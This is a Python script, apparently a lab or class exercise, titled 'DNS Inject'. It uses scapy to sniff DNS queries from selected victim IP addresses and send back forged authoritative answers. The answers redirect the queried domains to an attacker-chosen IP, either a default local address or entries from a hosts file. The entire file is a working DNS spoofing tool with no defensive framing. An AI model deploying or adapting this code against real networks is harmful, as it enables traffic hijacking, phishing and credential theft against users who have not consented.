import argparse
import os
from scapy.all import *

def check_arg():
	parser = argparse.ArgumentParser(description='DNS Inject', add_help=False)
	parser.add_argument('-i', nargs='?', action="store")
	parser.add_argument('-h', nargs='?', action="store")
	parser.add_argument('filter', nargs='*',action="store")
	args = parser.parse_args()

	return args.i, args.h, args.filter

def dns_inject(packet):
	# ........................ Check which ones are victims..........................
	# ........................ Get redirect_to .....................................
	#print(packet)
	
	if(packet.haslayer(DNSQR)):
		if(packet[IP].src in expression):
			print("src", packet[IP].src)
			print(expression)
			if(hostFlag==0):
				#print(packet[DNS].qd.qname.rstrip('.'))
				domain = packet[DNS].qd.qname.decode('ASCII').rsplit('.', 1)[0]
				print(domain)
				if(domain in host.keys()):
					redirect_to = host[domain]
					print("From here")
				else:
					redirect_to = '192.168.10.133'
			else:
				redirect_to = host
			print(redirect_to)
			spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                              UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                              DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
                              an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=redirect_to))
			send(spoofed_pkt)

if __name__ == '__main__':
	#print(os.sys.path)
	#os.sys.path.append('/usr/local/lib/python3.5/site-packages')
	interface,hostfile,expression = check_arg()
	hostFlag=0
	if(interface==None):
		## .....................Write code to get default interface..................
		interface='ens33'
	if(hostfile==None):
		## ....................Write code to get local machine IP address
		host='192.168.10.133'
		hostFlag=1
	else:
		f = open(hostfile,"r")
		host = {}
		for line in f:
			hostline = line.split()
			host[hostline[1]] = hostline[0]
			print(host)
	sniff(filter='udp port 53', iface=interface, store=0, prn=dns_inject)
	print('interface =',interface)
	print('filename =',hostfile)
	print('filter =',expression) 
